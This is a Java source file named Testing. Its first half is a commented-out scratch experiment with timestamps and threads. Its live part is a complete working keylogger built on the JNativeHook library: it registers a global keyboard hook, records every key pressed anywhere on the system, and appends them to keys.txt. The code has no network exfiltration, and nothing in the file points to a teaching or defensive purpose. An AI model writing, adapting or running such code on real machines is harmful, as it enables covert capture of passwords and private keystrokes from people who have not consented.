//import java.util.ArrayList;
//import java.util.HashMap;
//import java.util.List;
//import java.util.Map;
//import java.util.concurrent.TimeUnit;
//
//public class Testing {
//    public static void main(String[] args) {
//       /*TimeClass timeClass = new TimeClass();
//        List<String> list=new ArrayList<String>();
//
//        for(int i=0;i<5;i++){
//           try {
//               TimeUnit.SECONDS.sleep(3);
//               list.add(timeClass.getTime());
//
//           } catch (InterruptedException e) {
//               throw new RuntimeException(e);
//           }
//       }
//
//        //
//        for(int i=0;i<list.size();i++){
//            System.out.println(list.get(i));
//           *//* System.out.println("Printing array splitted");
//            String[] splited = list.get(i).split(":");
//            for(int j=0;j<splited.length;j++){
//                System.out.println("at "+ j + " we have "+ splited[j]);
//            }*//*
//        }
//            String[] currentTime = timeClass.getTime().split(":");
//        System.out.println("Current time "+ currentTime[2]);
//        for(int i=0;i<list.size();i++){
//            //System.out.println(list.get(i));
//            //System.out.println("Printing array splitted");
//            String[] splited = list.get(i).split(":");
//            if(Integer.parseInt(currentTime[2]) - Integer.parseInt(splited[2]) > 3)
//                System.out.println("your desired time  is "+ list.get(i));
//
//        }*/
//
//
///*
//        Map<String,String> obj = new HashMap<String, String>();
//        obj.put("1","2");
//
//*/
//
////        System.out.println("hi");
////
////        new Thread(new TestingThread()).start();
////
////        try {
////            Thread.sleep(12000);
////        } catch (InterruptedException e) {
////            throw new RuntimeException(e);
////        }
////        System.out.println("Hey what is up the sky is up");
//
//    B a = new B();
//    a.print();
//
//    }
//
//
//}


//------------------------------------------------------------------------------------------


import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.logging.Level;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author vakho
 */
public class Testing implements NativeKeyListener {

    private static final Path file = Paths.get("keys.txt");
    private static final Logger logger = LoggerFactory.getLogger(Testing.class);

    public static void main(String[] args) {

        logger.info("Key logger has been started");

        init();

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            logger.error(e.getMessage(), e);
            System.exit(-1);
        }

        GlobalScreen.addNativeKeyListener(new Testing());
    }

    private static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());

        try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {

            if (keyText.length() > 1) {
                writer.print("[" + keyText + "]");
            } else {
                writer.print(keyText);
            }

        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
            System.exit(-1);
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Nothing
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Nothing here
    }
}
